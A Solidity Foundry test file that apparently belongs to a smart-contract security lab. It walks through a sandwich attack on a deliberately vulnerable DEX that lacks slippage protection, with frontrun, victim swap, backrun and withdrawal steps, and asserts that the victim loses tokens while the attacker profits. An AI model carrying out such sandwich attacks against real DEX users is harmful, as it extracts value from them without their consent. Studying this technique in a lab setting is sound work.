// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {VulnerableDEX} from "../contracts/04 - Front-Running/VulnerableDEX.sol";
import {AttackFrontRun} from "../contracts/04 - Front-Running/AttackFrontRun.sol";

/**
 * @title FrontRunTest
 * @notice Demonstrates a sandwich attack against a DEX with no slippage protection.
 *
 * Scenario:
 *   - DEX is seeded with 10 ETH + 10,000 tokens (price = 1000 tokens/ETH)
 *   - Victim wants to swap 1 ETH for tokens
 *   - Attacker sees victim's tx in the mempool and sandwiches it
 *
 * Two tests:
 *   1. test_NoSandwich  — baseline: what victim gets without interference
 *   2. test_SandwichAttack — victim gets far fewer tokens; attacker profits
 */
contract FrontRunTest is Test {
    VulnerableDEX dex;
    AttackFrontRun attackContract;

    address victim = makeAddr("victim");
    address attackerEOA = makeAddr("attacker");

    uint256 constant DEX_SEED_ETH = 10 ether;
    uint256 constant VICTIM_SWAP = 1 ether;
    uint256 constant ATTACKER_FRONTRUN_ETH = 5 ether;

    function setUp() public {
        // Deploy DEX with 10 ETH liquidity (price: 1 ETH = 1000 tokens)
        dex = new VulnerableDEX{value: DEX_SEED_ETH}();

        // Fund actors
        vm.deal(victim, VICTIM_SWAP);
        vm.deal(attackerEOA, ATTACKER_FRONTRUN_ETH);

        // Deploy attack contract, fund it with attacker's ETH
        vm.prank(attackerEOA);
        attackContract = new AttackFrontRun{value: ATTACKER_FRONTRUN_ETH}(address(dex));
    }

    /// @notice Baseline: victim swaps with no interference
    function test_NoSandwich() public {
        uint256 expected = dex.getAmountOut(VICTIM_SWAP, true);

        vm.prank(victim);
        uint256 actual = dex.swapETHForTokens{value: VICTIM_SWAP}();

        assertEq(actual, expected, "Should match preview");

        console.log("=== NO SANDWICH (baseline) ===");
        console.log("Victim tokens received:", actual);
        // With 10 ETH pool and 1 ETH swap: 10000 * 1 / (10 + 1) = 909 tokens
    }

    /// @notice Sandwich attack: attacker frontruns and backruns victim's swap
    function test_SandwichAttack() public {
        // Record what victim would get without sandwich
        uint256 expectedTokensNoSandwich = dex.getAmountOut(VICTIM_SWAP, true);

        // ---------------------------------------------------------------
        // STEP 1 — FRONTRUN: attacker buys tokens (higher gas in real mempool)
        // Pushing price: ethReserve up, tokenReserve down → victim gets less
        // ---------------------------------------------------------------
        vm.prank(attackerEOA);
        attackContract.frontrun(ATTACKER_FRONTRUN_ETH);

        uint256 priceAfterFrontrun = dex.getAmountOut(VICTIM_SWAP, true);
        assertLt(priceAfterFrontrun, expectedTokensNoSandwich, "Frontrun raised price");

        // ---------------------------------------------------------------
        // STEP 2 — VICTIM executes at now-worse price (no minAmountOut guard)
        // ---------------------------------------------------------------
        vm.prank(victim);
        uint256 victimTokens = dex.swapETHForTokens{value: VICTIM_SWAP}();

        // ---------------------------------------------------------------
        // STEP 3 — BACKRUN: attacker sells tokens, restoring price + profit
        // ---------------------------------------------------------------
        vm.prank(attackerEOA);
        attackContract.backrun();

        // Attacker withdraws ETH to EOA
        uint256 attackerBalanceBefore = attackerEOA.balance; // 0 (all sent to contract)
        vm.prank(attackerEOA);
        attackContract.withdraw();
        uint256 attackerProfit = attackerEOA.balance - attackerBalanceBefore - ATTACKER_FRONTRUN_ETH;

        // ---------------------------------------------------------------
        // Assertions
        // ---------------------------------------------------------------

        // Victim received fewer tokens than expected
        assertLt(victimTokens, expectedTokensNoSandwich, "Victim was sandwiched");

        // Attacker's ETH recovered > amount fronted (profit > 0)
        assertGt(attackerEOA.balance, ATTACKER_FRONTRUN_ETH, "Attacker profited");

        console.log("=== SANDWICH ATTACK ===");
        console.log("Victim expected (no sandwich):", expectedTokensNoSandwich);
        console.log("Victim actual (sandwiched):   ", victimTokens);
        console.log("Slippage suffered (tokens):   ", expectedTokensNoSandwich - victimTokens);
        console.log("Attacker fronted (ETH):       ", ATTACKER_FRONTRUN_ETH);
        console.log("Attacker recovered (ETH):     ", attackerEOA.balance);
        console.log("Attacker profit (ETH wei):    ", attackerProfit);
    }
}
